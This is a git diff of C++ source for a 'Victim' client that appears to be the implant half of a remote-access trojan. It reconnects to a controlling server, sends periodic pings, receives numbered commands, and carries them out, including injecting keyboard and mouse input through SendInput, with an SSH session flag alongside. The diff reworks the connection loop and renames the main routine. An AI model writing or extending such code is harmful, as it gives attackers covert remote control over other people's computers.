@@ -11,22 +11,34 @@ Victim::Victim(std::string inHId)
 {
 }
 
-int Victim::runVictimProcess()
+int Victim::runProcess()
 {
 	while (!connectServer())
 		sf::sleep(sf::seconds(5));
 
-	while (true) {
-		sf::Packet p;
-		auto status = server.receive(p);
+	sf::Clock pingTimer;
+	pingTimer.start();
 
-		if (status == sf::Socket::Status::Disconnected) {
-			isSshActive = false;
-			while (!connectServer())
-				sf::sleep(sf::seconds(2));
+	while (true) {
+		if (pingTimer.getElapsedTime() > sf::seconds(3)) {
+			pingTimer.restart();
+
+			sf::Packet p;
+			p << uint16_t(0) << uint8_t(Cmd::PING);
+			auto _ = server.send(p);
 		}
-		if (status != sf::Socket::Status::Done)
+
+		sf::Packet p;
+		server.setBlocking(false);
+		auto status = server.receive(p);
+		server.setBlocking(false);
+
+		if (status == sf::Socket::Status::Disconnected)
+			break;
+		if (status != sf::Socket::Status::Done) {
+			sf::sleep(sf::milliseconds(20));
 			continue;
+		}
  
 		uint16_t reqId = 0;
 		uint8_t cmd;
@@ -160,20 +172,18 @@ int Victim::runVictimProcess()
 			SendInput(1, &input, sizeof(INPUT));
 		}
 		//unknown command
-		else {
+		else
 			std::cerr << "unknown command received: " << int(cmd) << "\n";
-			continue;
-		}
 	}
+
+	isSshActive = false;
+	server.disconnect();
 
 	return 0;
 }
 
 bool Victim::connectServer()
 {
-	isInitialized = false;
-	server.disconnect();
-
 	//connect to the server
 	if (server.connect(serverIp, serverPort) != sf::Socket::Status::Done)
 		return false;
@@ -225,6 +235,5 @@ bool Victim::connectServer()
 	}
 
 	res >> myId;
-	isInitialized = true;
 	return true;
 }
